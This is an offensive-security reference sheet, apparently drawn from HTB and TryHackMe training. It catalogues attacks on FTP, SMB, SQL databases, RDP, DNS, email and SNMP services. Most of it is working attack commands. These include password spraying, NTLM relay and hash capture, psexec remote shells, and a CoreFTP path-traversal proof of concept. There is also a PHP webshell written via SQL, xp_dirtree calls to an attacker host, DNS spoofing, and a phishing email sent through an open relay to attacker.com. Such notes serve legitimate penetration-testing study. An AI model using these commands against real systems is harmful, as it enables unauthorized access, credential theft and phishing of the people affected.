---
title: "Network Service Attacks"
type: technique
tags: [dns, enumeration, exploitation, htb, network, rdp, smb, thm]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-common-services, thm-linux-smb, thm-linux-services, thm-linux-pop3]
---

# Network Service Attacks

## What It Is

Attacking common network services involves exploiting misconfigurations, weak credentials, excessive privileges, or known vulnerabilities in protocols such as FTP, SMB, SQL databases, RDP, DNS, SMTP, POP3, and IMAP to gain unauthorized access, execute commands, or extract sensitive data. Every service exposes an attack surface that can be mapped to a consistent pattern: a source of attacker-controlled input reaches a vulnerable process running under specific privileges and produces a useful destination (code execution, credential capture, or data exfiltration).

## General Approach

1. **Banner grab / version scan** — identify the service, version, and OS.
2. **Enumerate misconfigurations** — anonymous/null sessions, default credentials, open relays, zone transfers.
3. **Brute force or password spray** — use known usernames with common or leaked passwords; respect lockout thresholds.
4. **Protocol-specific exploitation** — leverage service-native features (xp_cmdshell, tscon, VRFY, AXFR, bounce attack, etc.).
5. **Post-exploitation** — extract credentials, pivot via linked servers or relay attacks, escalate privileges.

---

## FTP (Port 21 / 2121)

### Anonymous Login

FTP servers may allow `anonymous` as the username with no password. Anonymous access can expose sensitive files and, if write permissions are misconfigured, allow uploading malicious scripts that a web server may execute.

```sh
ftp <IP>
# Username: anonymous  Password: (blank)
ftp> ls
ftp> get <file>
ftp> mget *
```

Nmap's default scripts automatically check for anonymous FTP login:

```sh
sudo nmap -sC -sV -p 21 <IP>
```

### Brute Force

```sh
medusa -u <username> -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
medusa -U users.list -P passwords.list -h <IP> -n 2121 -M ftp -t 50
```

### FTP Bounce Attack

The FTP bounce attack abuses the `PORT` command to proxy connections through an FTP server and scan or reach internal hosts that are not directly exposed:

```sh
nmap -Pn -v -n -p80 -b anonymous:password@<FTP_IP> <INTERNAL_IP>
```

### Notable FTP CVEs

| CVE | Description |
|-----|-------------|
| CVE-2022-22836 | CoreFTP before build 727 — authenticated path traversal via HTTP PUT, leading to arbitrary file write outside the FTP root |

**CoreFTP CVE-2022-22836 PoC:**

```sh
curl -k -X PUT -H "Host: <IP>" --basic -u <user>:<pass> \
  --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

---

## SMB (Ports 139 / 445)

Server Message Block provides file sharing, printer access, and RPC. On Windows 2000+, SMB runs directly over TCP/445; legacy NetBIOS uses 139. Samba brings SMB to Linux/Unix.

### Null Session Enumeration

A null session requires no credentials. Many tools support it.

```sh
# List shares
smbclient -N -L //<IP>

# Enumerate permissions
smbmap -H <IP>
smbmap -H <IP> -r <share>
smbmap -H <IP> --download "<share>\<file>"

# RPC null session
rpcclient -U'%' <IP>
rpcclient $> enumdomusers
rpcclient $> queryuser <username>

# Full automated null-session enum
./enum4linux-ng.py <IP> -A -C
```

### Brute Force / Password Spray

```sh
# Password spray with CrackMapExec
crackmapexec smb <IP> -u /tmp/userlist.txt -p 'Company01!' --local-auth
crackmapexec smb <CIDR> -u administrator -p 'Password123!' --loggedon-users

# Dump SAM hashes (requires admin)
crackmapexec smb <IP> -u administrator -p 'Password123!' --sam

# Pass-the-Hash
crackmapexec smb <IP> -u Administrator -H <NTLM_HASH>
```

### Remote Code Execution via SMB

```sh
# Impacket PsExec (requires admin$ write access)
impacket-psexec administrator:'Password123!'@<IP>

# Impacket SMBExec / atexec
impacket-smbexec administrator:'Password123!'@<IP>

# CrackMapExec exec
crackmapexec smb <IP> -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

### Forced Authentication / NTLM Hash Capture

Responder poisons LLMNR/NBT-NS/MDNS to capture NTLMv2 hashes from machines that mistype share names or resolve hostnames via broadcast:

```sh
sudo responder -I <interface>
# Hashes land in /usr/share/responder/logs/
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Relay Attack

When SMB signing is disabled, captured hashes can be relayed directly to other hosts:

```sh
# 1. Disable SMB in Responder
# Edit /etc/responder/Responder.conf → SMB = Off
sudo responder -I <interface>

# 2. Relay to target (dumps SAM by default)
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>

# 3. Or execute a command via relay
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<cmd>'
```

### Skynet CTF — SMB Chained Attack Pattern

A real-world example from the Skynet THM room demonstrates the chaining approach:
1. Enumerate SMB shares with `smbmap` / `smbclient` (null session).
2. Recover a username from files in an open share.
3. Brute-force a webmail login using the username and a password list found on the SMB share.
4. Read emails containing the SMB share password.
5. Access the authenticated share, find a hidden directory path, and chain into a CMS local file inclusion.

### Notable SMB CVEs

| CVE | Name | Description |
|-----|------|-------------|
| CVE-2020-0796 | SMBGhost | SMBv3.1.1 compression — integer overflow in SMB driver allowing unauthenticated RCE on Windows 10 1903/1909 |
| CVE-2017-0144 | EternalBlue | SMBv1 buffer overflow enabling unauthenticated RCE; basis of WannaCry/NotPetya (historical but still relevant) |

---

## SQL Databases — MySQL (3306) / MSSQL (1433/1434/2433)

Database hosts are high-value targets because they store credentials, PII, and business data, and often run as highly privileged service accounts.

### Authentication Modes

- **MSSQL:** Windows Authentication (integrated, no extra creds needed if user is already authed) or SQL Server Mixed Mode (username + password pair stored in SQL Server).
- **MySQL:** Username/password; Windows Authentication available via plugin.

Misconfigured MSSQL may allow anonymous login, blank SA password, or guest account access.

### Connecting

```sh
# MSSQL from Linux
sqsh -S <IP> -U <user> -P '<pass>' -h
mssqlclient.py -p 1433 <user>@<IP>

# MSSQL from Windows
sqlcmd -S <IP> -U <user> -P '<pass>' -y 30 -Y 30

# MySQL
mysql -u <user> -p<pass> -h <IP>
```

### Enumerate Databases

```sql
-- MySQL
SHOW DATABASES;
USE <db>;
SHOW TABLES;
SELECT * FROM users;

-- MSSQL (sqlcmd syntax)
SELECT name FROM master.dbo.sysdatabases
GO
SELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES
GO
```

### MSSQL — xp_cmdshell (OS Command Execution)

`xp_cmdshell` is disabled by default but can be enabled by a sysadmin:

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- Execute OS command
xp_cmdshell 'whoami'
GO
```

### MySQL — Write Webshell via SELECT INTO OUTFILE

```sql
-- Check if writes are allowed (empty = unrestricted)
SHOW VARIABLES LIKE "secure_file_priv";

-- Write PHP webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### MSSQL — Capture Service Hash via xp_dirtree / xp_subdirs

Point an undocumented stored procedure at an attacker-controlled SMB share to steal the NTLMv2 hash of the SQL Server service account:

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO

EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
GO
```

Run simultaneously on the attacker:

```sh
sudo responder -I tun0
# or
sudo impacket-smbserver share ./ -smb2support
```

Then crack with hashcat:

```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### MSSQL — User Impersonation (Privilege Escalation)

```sql
-- Find impersonatable users
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Impersonate sa (or other sysadmin)
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Revert
REVERT
GO
```

### MSSQL — Linked Server Lateral Movement

```sql
-- Identify linked servers (isremote=1 is remote, isremote=0 is linked)
SELECT srvname, isremote FROM sysservers
GO

-- Execute command on linked server
EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [<LINKED_SERVER>]
GO
```

### MSSQL — Read Local Files

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

### MySQL — Read Local Files

```sql
SELECT LOAD_FILE("/etc/passwd");
```

### Notable SQL CVEs

| CVE | Description |
|-----|-------------|
| CVE-2012-2122 | MySQL 5.6.x timing attack auth bypass — repeated incorrect password eventually authenticates |

---

## RDP (Port 3389)

Remote Desktop Protocol provides GUI access to Windows systems. It is widely deployed for remote administration, making it an attractive target.

### Brute Force / Password Spray

```sh
# Crowbar
crowbar -b rdp -s <IP>/32 -U users.txt -c 'password123'

# Hydra
hydra -L usernames.txt -p 'password123' <IP> rdp

# Connect
xfreerdp /v:<IP> /u:<user> /p:<password>
rdesktop -u <user> -p <password> <IP>
```

### RDP Session Hijacking (tscon)

If you have SYSTEM privileges on a machine where another user is RDP'd in, you can steal their session without knowing their password:

```powershell
# List sessions
query user

# Create a service that runs tscon as SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>"
net start sessionhijack
```

Note: This method does not work on Windows Server 2019+.

### RDP Pass-the-Hash

Requires `Restricted Admin Mode` to be enabled on the target (disabled by default):

```powershell
# Enable Restricted Admin Mode on target
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# RDP with NT hash
xfreerdp /v:<IP> /u:<user> /pth:<NTLM_HASH>
```

### Notable RDP CVEs

| CVE | Name | Description |
|-----|------|-------------|
| CVE-2019-0708 | BlueKeep | Pre-authentication UAF in the RDP virtual channel handler; leads to SYSTEM-level RCE on Windows 7/Server 2008; exploiting it can cause BSoD |

---

## DNS (Port 53 UDP/TCP)

DNS is critical infrastructure. Misconfigurations in zone transfers and subdomain management expose the full DNS namespace and enable phishing and MITM attacks.

### Zone Transfer (AXFR)

An improperly configured DNS server responds to zone transfer requests from any source:

```sh
# Dig AXFR
dig AXFR @<NAMESERVER_IP> <domain>

# Fierce (automated zone transfer + brute force)
fierce --domain <domain>
```

### Subdomain Enumeration

```sh
# Subfinder (OSINT-based)
./subfinder -d <domain> -v

# Subbrute (pure DNS brute force, works internally)
git clone https://github.com/TheRook/subbrute.git
echo "<resolver_IP>" > ./resolvers.txt
./subbrute.py <domain> -s ./names.txt -r ./resolvers.txt

# Check CNAME records for takeover candidates
host <subdomain>
nslookup -type=CNAME <subdomain>
```

### Subdomain Takeover

If a subdomain's CNAME points to a third-party service (AWS S3, GitHub Pages, Fastly, etc.) that no longer has the corresponding resource:
1. The third-party shows an HTTP 404 / "NoSuchBucket" / "There isn't a GitHub Pages site here" error.
2. The attacker registers the resource at that third-party service.
3. Traffic for the subdomain now flows to the attacker.

Reference: [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)

### DNS Cache Poisoning (Local Network)

Using Ettercap with a MITM position:

```sh
# Edit /etc/ettercap/etter.dns
# inlanefreight.com    A   <ATTACKER_IP>
# *.inlanefreight.com  A   <ATTACKER_IP>

ettercap -T -M arp -P dns_spoof /<VICTIM_IP>// /<GATEWAY_IP>//
```

Using Bettercap:

```sh
bettercap -iface <interface>
# In bettercap console:
set dns.spoof.domains <domain>
dns.spoof on
```

### Notable DNS Vulnerabilities

Subdomain takeover is the most impactful current DNS risk at scale. A 2020 RedHuntLabs study found 424,120 vulnerable subdomains across 220 million domains studied; 62% were in e-commerce. No single CVE — it is a systemic misconfiguration pattern.

---

## SMTP / Email Services (Ports 25, 465, 587, 143, 110, 993, 995)

Email servers run multiple protocols: SMTP for sending (port 25/465/587), POP3 for retrieval (110/995), IMAP for synced retrieval (143/993).

### Identify Mail Server (MX Records)

```sh
host -t MX <domain>
dig mx <domain> | grep "MX" | grep -v ";"
```

### Port Scan

```sh
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <IP>
```

### User Enumeration — SMTP VRFY / EXPN / RCPT TO

```sh
# Manual telnet
telnet <IP> 25
VRFY root
EXPN support-team
MAIL FROM:test@test.com
RCPT TO:john
```

Automated:

```sh
smtp-user-enum -M RCPT -U userlist.txt -D <domain> -t <IP>
smtp-user-enum -M VRFY -U userlist.txt -t <IP>
```

### User Enumeration — POP3 USER Command

```sh
telnet <IP> 110
USER julio    # -ERR = user does not exist
USER john     # +OK = user exists
```

### Password Brute Force

```sh
hydra -L users.txt -p 'Company01!' -f <IP> pop3
hydra -l <user>@<domain> -P /usr/share/wordlists/rockyou.txt smtp://<IP> -f
```

### Reading Email via POP3 (Manual)

```sh
nc <IP> 110
USER <username>
PASS <password>
LIST
RETR 1
RETR 2
```

### Cloud Email Enumeration / Spray

```sh
# Validate O365 domain
python3 o365spray.py --validate --domain <domain>

# Enumerate users
python3 o365spray.py --enum -U users.txt --domain <domain>

# Password spray
python3 o365spray.py --spray -U users.txt -p 'March2022!' --count 1 --lockout 1 --domain <domain>
```

### Open Relay Abuse

```sh
# Detect open relay
nmap -p25 -Pn --script smtp-open-relay <IP>

# Send phishing email through open relay
swaks --from notifications@<domain> \
      --to employees@<domain> \
      --header 'Subject: Company Notification' \
      --body 'http://attacker.com/phish' \
      --server <IP>
```

### POP3 in Practice — Fowsniff CTF Chain

A practical attack chain from the Fowsniff THM room:
1. MD5 password hashes leaked online; cracked with John the Ripper (`--format=Raw-MD5`).
2. Authenticated to POP3 with cracked credentials; retrieved emails containing an SSH temporary password.
3. SSH login, kernel exploit (searchsploit for kernel version), then SUID/startup script abuse for root.

### POP3 in Practice — GoldenEye Chain

A multi-stage chain from the GoldenEye THM room:
1. JS source in a web page contained an HTML-encoded password (decoded with CyberChef).
2. Hydra brute-forced POP3 (non-standard port 55007) for multiple users.
3. Emails contained credentials for a Moodle CMS; admin panel used for Python reverse shell.
4. Kernel exploit (3.13.0-32-generic, EDB-37292) for root.

### Notable Email CVEs

| CVE | Description |
|-----|-------------|
| CVE-2020-7247 | OpenSMTPD <= 6.6.2 — pre-auth RCE via semicolon injection in the sender address field; exploitable since 2018 |

---

## POP3 / IMAP — Credential Brute Force & Email Extraction

POP3 and IMAP are the primary email retrieval protocols. After obtaining credentials (via brute force, capture, or leaked hash cracking), an attacker can read all stored email for intelligence, lateral movement credentials, and sensitive data.

```sh
# POP3 brute force
hydra -L users.txt -P passwords.txt <IP> pop3

# IMAP brute force
hydra -L users.txt -P passwords.txt <IP> imap

# Read POP3 inbox interactively
nc <IP> 110
USER <user>
PASS <pass>
LIST
RETR <message_number>
QUIT
```

For IMAP, use a mail client such as Evolution (`sudo apt-get install evolution`) or mutt to interact with mailboxes interactively.

---

## SNMP (Ports 161 UDP / 162 UDP)

SNMP (Simple Network Management Protocol) is used for network device management. Community strings act as passwords; "public" (read) and "private" (read-write) are often left at defaults.

### Community String Enumeration

```sh
# Brute-force community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt <IP>

# Walk MIB tree (read all OIDs)
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1    # System info
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4  # Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6  # Installed software
```

### SNMP Write Abuse (private community)

If the `private` community string is known and the device allows SNMP sets, an attacker can modify running configuration — potentially changing device settings, adding routes, or overwriting credentials:

```sh
snmpset -v2c -c private <IP> <OID> <type> <value>
```

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| [[nmap]] | Port scanning, service versioning, NSE scripts (ftp-anon, smtp-open-relay, smb-protocols) |
| [[metasploit]] | Exploit delivery (EternalBlue, BlueKeep, etc.) |
| [[hydra]] | Brute force — FTP, SSH, RDP, SMB, SMTP, POP3, IMAP, HTTP |
| smbclient | SMB share interaction, file download/upload |
| smbmap | SMB share enumeration with permissions |
| enum4linux-ng | Automated SMB null-session enumeration |
| CrackMapExec (CME) | SMB auth, spray, exec, hash dump, multi-host |
| impacket-psexec | SMB-based SYSTEM shell |
| impacket-ntlmrelayx | NTLM relay attacks |
| Responder | LLMNR/NBT-NS poisoning, NTLMv2 capture |
| sqlcmd / sqsh / mssqlclient.py | MSSQL interaction |
| mysql | MySQL interaction |
| dig / fierce / subfinder / subbrute | DNS enumeration and zone transfer |
| smtp-user-enum | SMTP VRFY/EXPN/RCPT user enumeration |
| swaks | SMTP testing, open relay abuse |
| o365spray | Office 365 user enum and password spray |
| snmpwalk / onesixtyone | SNMP community string brute force and MIB walk |
| crowbar | RDP password spray |
| xfreerdp | RDP client with PtH support |
| medusa | Multi-protocol brute force (FTP, SSH, SMB, etc.) |

---

## Latest Vulnerabilities Per Service

| Service | CVE | Name | Impact |
|---------|-----|------|--------|
| FTP | CVE-2022-22836 | CoreFTP path traversal | Authenticated arbitrary file write |
| SMB | CVE-2020-0796 | SMBGhost | Unauthenticated RCE (Win 10 1903/1909) |
| SMB | CVE-2017-0144 | EternalBlue | Unauthenticated RCE via SMBv1 |
| RDP | CVE-2019-0708 | BlueKeep | Unauthenticated RCE (Win 7/Server 2008) |
| SMTP | CVE-2020-7247 | OpenSMTPD RCE | Pre-auth RCE via sender field injection |
| MySQL | CVE-2012-2122 | MySQL auth bypass | Timing attack auth bypass |
| DNS | — | Subdomain takeover | Phishing, CORS abuse, cookie theft at scale |

---

## Sources

- CPTS Module 116: Attacking Common Services (HTB Academy)
- THM Skynet room — SMB null session + hydra + CMS exploitation chain
- THM Fowsniff CTF — POP3 brute force + email-based credential extraction
- THM GoldenEye — POP3 multi-stage pivot + kernel exploit
- THM IDE — vsftpd anonymous FTP + Codiad RCE + service privesc
- THM BiteMe — Fail2ban abuse for root
